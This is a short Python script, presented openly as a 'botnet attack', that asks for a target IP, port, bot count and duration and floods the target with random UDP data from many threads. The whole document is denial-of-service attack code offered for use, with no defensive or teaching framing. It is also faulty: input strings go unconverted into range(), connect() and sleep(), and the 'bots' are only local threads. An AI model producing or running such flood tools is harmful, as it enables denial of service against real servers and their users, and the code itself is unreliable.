import socket
import threading
import time
import random

target_server = input("Enter the target ip: ")
target_port = input("Enter the target port: ")
botnet_size = input("Enter the bots count: ")
attack_duration = input("Duration: ")

def send_flood(sock):
    while True:
        try:
            sock.send(random._urandom(1024))  # Send random data to flood the server
        except socket.error:
            break

def attack():
    for _ in range(botnet_size):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect((target_server, target_port))
        threading.Thread(target=send_flood, args=(sock,)).start()

    print(f"Botnet attack launched with {botnet_size} bots!")
    time.sleep(attack_duration)
    print("Attack completed!")

if __name__ == "__main__":
    attack()
